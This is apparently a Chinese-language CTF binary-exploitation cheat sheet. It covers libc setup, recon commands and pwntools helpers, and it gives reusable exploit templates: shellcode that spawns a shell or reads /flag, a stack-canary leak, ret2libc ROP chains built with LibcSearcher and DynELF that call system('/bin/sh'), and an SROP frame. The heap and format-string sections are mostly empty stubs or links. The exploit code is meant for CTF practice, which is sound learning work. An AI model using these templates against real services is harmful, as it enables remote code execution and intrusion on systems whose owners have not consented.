# Libc



## 配置libc

### 1. 工具准备

```shell
sudo apt update
sudo apt install -y patchelf wget
sudo wget https://github.com/io12/pwninit/releases/download/3.3.0/pwninit -O /usr/local/bin/pwninit
sudo chmod +x /usr/local/bin/pwninit
```



### 2. 配置libc

#### 2.1 无符号

```shell
pwninit --bin pwn --libc libc*
chmod +x ld*
```

#### 2.2 有符号

```shell
pwninit --bin pwn --libc libc* --ld ld*
chmod +x ld*
```



# 常用命令



## 1. 通用

### 1.1 信息搜集

```shell
file pwn
checksec pwn
```



## 2. 栈



## 3. 堆



## 4. 沙箱



# 汇编代码



## 1. leave

```assembly
mov rsp, rbp
pop rbp
(rsp += 8)
```



## 2. ret

```assembly
pop rip
(rsp += 8)
```



# 数据搜集



## 手动

```shell
strings -a -t x libc.so.6 | grep "/bin/sh"

ropper -f pwn --search "pop rsi; ret;"

readelf -s pwn | grep puts

objdump -R pwn | grep puts # got

objdump -d pwn | grep puts # plt

objdump -T libc.so.6 | grep puts # got

nm -D libc.so.6 | grep stdout

vmmap # libc
```



## 脚本

```python
# r = remote("127.0.0.1", 12892)
r = process(["./pwn"])

elf = ELF("./pwn")
libc = ELF("libc.so.6")
rop = ROP([elf])

# gdb.attach(r, """b *0x40134A""")

cyclic(0xdeadbeef)

rop.find_gadget(["pop rdi", "ret"])[0]

next(libc.search('/bin/sh\x00'.encode()))

libc.sym["system"]
```



# 脚本库



## 1. ctypes

### 1.1 rand

```python
from ctypes import *

libc = CDLL("libc.so.6")
libc.srand(int(time.time()))
rand = libc.rand()
```



# 绕过



## read覆盖

```c
read(0,s[40],sizeof(s)) // 会覆盖s末尾的\x00
```

```c
fgets(s[40],sizeof(s),stdin) // 不会覆盖s末尾的\x00 -> fgets读取输入后会追加\x00 -> 边界清晰
```



# 更换输出



## 1. 前置知识

```shell
0 → stdin  标准输入
1 → stdout 标准输出
2 → stderr 标准错误

close(1); # 关闭标准输出
```



## 2. 更换模板

```shell
exec 1>&0 # 将标准输出重定向到标准输入
```



# 数字打包



## 1. p??

```shell
int64 -> p64(-559038737)
```

```shell
int -> p32(-559038737)
```

```shell
int16 -> p16(-559038737)
```



## 2. pack

```shell
pack(-559038737, 32, endian='little', signed=True)
```



## 3. bytes

```shell
bytes([i]) # i ∈ (0,256)
```



# Shellcode



## 1. 模板

### 1.1 跳转到真实物理地址

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

payload = asm(shellcraft.sh())
payload += p64(backdoor_elf_addr)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```



### 1.2 获取指定文件的内容

```python
from pwn import *

context(os="linux", arch="amd64")

r = remote("localhost", 8080)

shellcode = shellcraft.openat(0, "/flag", 0)
shellcode += shellcraft.sendfile(1, 3, 0, 0x100)

payload = asm(shellcode)

r.sendlineafter("> \n".encode(), payload)

r.interactive()
```



# canary

## 1. 泄露模板

```python
payload = cyclic(40 - 1) + b"|"
r.sendafter(b"name?", payload)

r.recvuntil(b"|")
canary = u64(r.recv(6).ljust(8, b'\x00'))
print("canary", hex(canary))
```



# ret2libc



## 1. 有libc文件

```shell
1. 泄露libc_addr
2. 查找libc_offset
3. 计算libc_base
4. 查找one_gadget_libc_offset
5. 计算one_gadget_libc_addr
6. 执行one_gadget_libc_addr
```



## 2. 无libc文件

### 2.1 LibcSearcher

```python
from LibcSearcher import LibcSearcher

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(puts_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload: ".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

sleep(1)

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(ret_elf_addr) + p64(pop_rdi_ret_elf_addr) + p64(read_got_elf_addr) + p64(puts_plt_elf_addr)
payload += p64(ret_elf_addr) + p64(vuln_elf_addr)
r.sendafter("payload:".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode(), drop=False)[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)

# libc.select_libc(0)

puts_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_libc_offset

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi_ret_elf_addr) + p64(bin_sh_libc_addr) + p64(ret_elf_addr) + p64(system_libc_addr)
r.sendafter("payload:".encode(), payload)
```



### 2.2 DynELF

```python
def leak_got_libc_addr(addr):
    payload = cyclic(0x6C)
    payload += p32(0xdeadbeef)
    payload += p32(elf.plt["write"])
    payload += p32(main_elf_addr)
    payload += p32(1)
    payload += p32(addr)
    payload += p32(4)
    r.sendafter(b"~!\n", payload)
    return r.recv(4)

dnyELF = DynELF(leak_got_libc_addr, elf=elf) # type: ignore
system_libc_addr = dnyELF.lookup("system", "libc")

payload = cyclic(0x6C)
payload += p32(0xdeadbeef)
payload += p32(elf.plt["read"]) + p32(main_elf_addr) + p32(0) + p32(elf.bss() + 0x200) + p32(8)
r.sendafter(b"~!\n", payload)

r.send(b"/bin/sh\x00")

payload = cyclic(0x6C)
payload += p32(0xdeadbeef)
payload += p32(system_libc_addr) + p32(rop.find_gadget(["ret"])[0]) + p32(elf.bss() + 0x200)
r.sendafter(b"~!\n", payload)
```



# SROP

## 1. 模板

```python
bin_sh_elf_addr = 0x403033
syscall_ret_elf_addr = 0x401077

frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = bin_sh_elf_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret_elf_addr

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(syscall_ret_elf_addr)
payload += p64(syscall_ret_elf_addr)
payload += bytes(frame)
r.send(payload)

sleep(2)

r.send(cyclic(15))
```



# fmt



## 1. 栈上fmt



## 2. 非栈fmt



# Heap



## 1. 前置知识

### 1.1 教程

```html
https://blog.csdn.net/hnytgl/article/details/161080490
```

### 1.2 Chunk

```shell

```

### 1.3 Bin

- tcache
- fastbin
- small bin
- large bin
- unsorted bin



## 2. 堆覆盖

### 2.1 教程

```html
https://www.cnblogs.com/37blog/p/17808141.html
```



## 3. UAF

### 3.1 教程

```html
https://www.cnblogs.com/37blog/p/17808141.html
```
